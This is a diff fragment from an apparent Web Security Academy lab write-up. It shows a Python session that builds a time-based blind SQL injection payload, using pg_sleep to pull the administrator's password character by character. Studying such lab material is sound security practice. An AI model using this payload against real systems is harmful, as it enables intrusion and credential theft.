@@ -121,7 +121,7 @@ Type "help", "copyright", "credits" or "license" for more information.
 >>> length = range(1,7)
 >>> char = "abcdefghijklmnopqrstuvwxyz0123456789!\"#$%&'()*+,-./:;<=>?@[\]^_`{|}~"
 >>> url = "https://ac7d1f2f1f53d9aa806349cd00b20079.web-security-academy.net/"
->>> r = requests.get(url)
+>>> r = requests.get(url) # ignore this line since its not even gonna be used (my bad)
 >>> payload = "x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+substring(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"
 >>> for num in length:
 ...     for c in char:
